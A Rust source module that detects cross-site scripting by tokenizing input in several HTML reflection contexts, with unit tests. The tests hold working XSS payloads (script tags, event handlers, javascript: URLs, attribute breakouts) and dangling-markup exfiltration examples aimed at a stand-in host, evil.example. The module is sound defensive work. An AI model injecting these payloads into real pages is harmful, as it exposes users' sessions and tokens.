//! Cross-site scripting detection.
//!
//! The input is tokenized as HTML five times, once for each place a page
//! might reflect it (text, or inside an attribute value with each kind of
//! quoting), and the tokens are checked against a blocklist of tags,
//! attributes, URL schemes and style constructs that execute. There is no
//! JavaScript parsing: the question is only whether the bytes would become
//! active markup.

mod blocklist;
mod entities;
mod events;
mod tokenizer;

use std::fmt;

use blocklist::AttrKind;
pub use tokenizer::{Context, Token, Tokenizer};

/// Why an input was judged to be XSS.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Finding<'a> {
    /// The reflection context in which the input became active.
    pub context: Context,
    pub reason: Reason<'a>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reason<'a> {
    /// A doctype declaration, which only appears when a payload is trying
    /// to switch parsing mode.
    Doctype,
    /// A tag that loads or runs code, such as `script` or `iframe`.
    Tag(&'a [u8]),
    /// An attribute that runs its value, such as an event handler.
    Attribute(&'a [u8]),
    /// A URL attribute with an executable scheme.
    Url {
        attribute: &'a [u8],
        scheme: &'static [u8],
    },
    /// A form that submits to another origin, which exfiltrates whatever
    /// markup follows the injection point.
    CrossOriginForm {
        attribute: &'a [u8],
    },
    /// A cross-origin URL ending in its query string whose quote is never
    /// closed, so the rest of the page is sent along with the request.
    DanglingMarkup {
        attribute: &'a [u8],
    },
    /// A style attribute using an executable construct.
    Style {
        attribute: &'a [u8],
        construct: &'static [u8],
    },
    /// An attribute whose value names a dangerous attribute (SVG animation).
    IndirectAttribute {
        attribute: &'a [u8],
        target: &'a [u8],
    },
    Comment(CommentKind),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommentKind {
    /// IE ended a comment at a backtick, exposing what follows as markup.
    Backtick,
    /// `<!--[if ...]>`: IE conditional comments were parsed as HTML.
    Conditional,
    /// `<?xml`: IE treated XML processing instructions as markup.
    Xml,
    /// `<?import`: IE's element behaviour import.
    Import,
    /// `<!ENTITY`: an XML entity definition.
    Entity,
}

/// Returns why `input` would be XSS if a page reflected it, or `None` when
/// it is inert in every context.
pub fn detect_xss(input: &[u8]) -> Option<Finding<'_>> {
    Context::ALL
        .into_iter()
        .find_map(|context| scan(input, context).map(|reason| Finding { context, reason }))
}

fn scan(input: &[u8], context: Context) -> Option<Reason<'_>> {
    let mut pending: Option<(&[u8], AttrKind)> = None;
    for token in Tokenizer::new(input, context) {
        match token {
            Token::Doctype(_) => return Some(Reason::Doctype),
            Token::StartTag(name) if blocklist::is_dangerous_tag(name) => {
                return Some(Reason::Tag(name));
            }
            Token::AttrName(name) => {
                pending = blocklist::classify_attr(name).map(|kind| (name, kind));
            }
            Token::AttrValue(value) => {
                if let Some((attribute, kind)) = pending.take()
                    && let Some(reason) = check_value(attribute, kind, value)
                {
                    return Some(reason);
                }
            }
            Token::UnclosedAttrValue(value) => {
                if let Some((attribute, kind)) = pending.take() {
                    if let Some(reason) = check_value(attribute, kind, value) {
                        return Some(reason);
                    }
                    if matches!(kind, AttrKind::Url | AttrKind::FormTarget)
                        && blocklist::is_dangling_exfiltration(value)
                    {
                        return Some(Reason::DanglingMarkup { attribute });
                    }
                }
            }
            Token::Comment(body) => {
                if let Some(kind) = comment_kind(body) {
                    return Some(Reason::Comment(kind));
                }
            }
            _ => pending = None,
        }
    }
    None
}

fn check_value<'a>(attribute: &'a [u8], kind: AttrKind, value: &'a [u8]) -> Option<Reason<'a>> {
    match kind {
        AttrKind::Script => Some(Reason::Attribute(attribute)),
        AttrKind::Url => {
            blocklist::dangerous_scheme(value).map(|scheme| Reason::Url { attribute, scheme })
        }
        AttrKind::FormTarget => blocklist::dangerous_scheme(value)
            .map(|scheme| Reason::Url { attribute, scheme })
            .or_else(|| {
                blocklist::is_cross_origin(value).then_some(Reason::CrossOriginForm { attribute })
            }),
        AttrKind::Style => blocklist::dangerous_style(value).map(|construct| Reason::Style {
            attribute,
            construct,
        }),
        AttrKind::IndirectName => {
            blocklist::classify_attr(value).map(|_| Reason::IndirectAttribute {
                attribute,
                target: value,
            })
        }
    }
}

fn comment_kind(body: &[u8]) -> Option<CommentKind> {
    if body.contains(&b'`') {
        return Some(CommentKind::Backtick);
    }
    let starts_with = |keyword: &[u8]| {
        body.len() > keyword.len()
            && body[..keyword.len()].eq_ignore_ascii_case(keyword)
            && !body[keyword.len()].is_ascii_alphanumeric()
    };
    if starts_with(b"[if") {
        Some(CommentKind::Conditional)
    } else if starts_with(b"xml") {
        Some(CommentKind::Xml)
    } else if starts_with(b"import") {
        Some(CommentKind::Import)
    } else if starts_with(b"entity") {
        Some(CommentKind::Entity)
    } else {
        None
    }
}

impl fmt::Display for Finding<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{} in {} context", self.reason, self.context)
    }
}

impl fmt::Display for Context {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(match self {
            Context::Text => "text",
            Context::UnquotedAttribute => "unquoted attribute",
            Context::SingleQuotedAttribute => "single-quoted attribute",
            Context::DoubleQuotedAttribute => "double-quoted attribute",
            Context::BacktickAttribute => "backtick-quoted attribute",
        })
    }
}

impl fmt::Display for Reason<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Reason::Doctype => write!(f, "doctype declaration"),
            Reason::Tag(name) => write!(f, "<{}> tag", Escaped(name)),
            Reason::Attribute(name) => write!(f, "{} attribute", Escaped(name)),
            Reason::Url { attribute, scheme } => {
                write!(
                    f,
                    "{}: url in {} attribute",
                    Escaped(scheme),
                    Escaped(attribute)
                )
            }
            Reason::CrossOriginForm { attribute } => {
                write!(f, "cross-origin url in {} attribute", Escaped(attribute))
            }
            Reason::DanglingMarkup { attribute } => {
                write!(
                    f,
                    "unclosed cross-origin url in {} attribute",
                    Escaped(attribute)
                )
            }
            Reason::Style {
                attribute,
                construct,
            } => write!(
                f,
                "{} in {} attribute",
                Escaped(construct),
                Escaped(attribute)
            ),
            Reason::IndirectAttribute { attribute, target } => write!(
                f,
                "{} attribute targeting {}",
                Escaped(attribute),
                Escaped(target)
            ),
            Reason::Comment(kind) => f.write_str(match kind {
                CommentKind::Backtick => "backtick inside comment",
                CommentKind::Conditional => "conditional comment",
                CommentKind::Xml => "xml processing instruction",
                CommentKind::Import => "import processing instruction",
                CommentKind::Entity => "entity declaration",
            }),
        }
    }
}

/// Bytes rendered as printable ASCII, escaping the rest, for log lines.
struct Escaped<'a>(&'a [u8]);

impl fmt::Display for Escaped<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        const MAX: usize = 40;
        for &b in self.0.iter().take(MAX) {
            if (0x20..0x7f).contains(&b) && b != b'\\' {
                write!(f, "{}", b as char)?;
            } else {
                write!(f, "\\x{b:02x}")?;
            }
        }
        if self.0.len() > MAX {
            f.write_str("...")?;
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn reason(input: &[u8]) -> String {
        detect_xss(input).map(|f| f.to_string()).unwrap_or_default()
    }

    #[test]
    fn classic_payloads() {
        assert_eq!(
            reason(b"<script>alert(1)</script>"),
            "<script> tag in text context"
        );
        assert_eq!(
            reason(b"<img src=x onerror=alert(1)>"),
            "onerror attribute in text context"
        );
        assert_eq!(
            reason(b"<a href=\"javascript:alert(1)\">x</a>"),
            "javascript: url in href attribute in text context"
        );
        assert_eq!(
            reason(b"<svg><animate onbegin=alert(1)>"),
            "<svg> tag in text context"
        );
    }

    #[test]
    fn attribute_breakouts() {
        assert_eq!(
            reason(b"\" onmouseover=\"alert(1)"),
            "onmouseover attribute in unquoted attribute context"
        );
        assert_eq!(
            reason(b"x' onfocus='alert(1)' autofocus='"),
            "onfocus attribute in unquoted attribute context"
        );
    }

    #[test]
    fn benign_markup_and_text() {
        assert_eq!(reason(b"hello world"), "");
        assert_eq!(reason(b"1 < 2 && 3 > 2"), "");
        assert_eq!(reason(b"<p>Hello <b>world</b></p>"), "");
        assert_eq!(reason(b"<a href=\"https://example.com\">x</a>"), "");
        assert_eq!(reason(b"<div style=\"color: red\">x</div>"), "");
        assert_eq!(reason(b"Vec<String>"), "");
        // A bare URL is only dangerous once it sits in a URL attribute.
        assert_eq!(reason(b"javascript:alert(1)"), "");
        assert_eq!(reason(b""), "");
    }

    #[test]
    fn dangling_markup_forms() {
        assert_eq!(
            reason(b"<form action=\"//evil.example\"><input name=csrf value=\""),
            "cross-origin url in action attribute in text context"
        );
        assert_eq!(
            reason(b"<button formaction=\"https://evil.example\">x</button>"),
            "cross-origin url in formaction attribute in text context"
        );
        assert_eq!(
            reason(b"<form action=\"/submit\" method=\"post\"></form>"),
            ""
        );
        assert_eq!(
            reason(b"<img src=\"//evil.example?"),
            "unclosed cross-origin url in src attribute in text context"
        );
        assert_eq!(reason(b"<img src=\"https://example.com/a.png\">"), "");
        assert_eq!(reason(b"<img src=\"/a.png"), "");
        assert_eq!(reason(b"<a href=\"https://example.com/a"), "");
    }

    #[test]
    fn encoded_schemes_and_comments() {
        assert_eq!(
            reason(b"<a href=\"&#106;avascript:alert(1)\">"),
            "javascript: url in href attribute in text context"
        );
        assert_eq!(
            reason(b"<!--[if gte IE 4]><script>alert(1)</script><![endif]-->"),
            "conditional comment in text context"
        );
        assert_eq!(
            reason(b"<!-- --`><img src=x onerror=alert(1)> -->"),
            "backtick inside comment in text context"
        );
    }

    #[test]
    fn escaped_bytes_in_messages() {
        assert_eq!(reason(b"<scr\0ipt>"), "<scr\\x00ipt> tag in text context");
    }
}
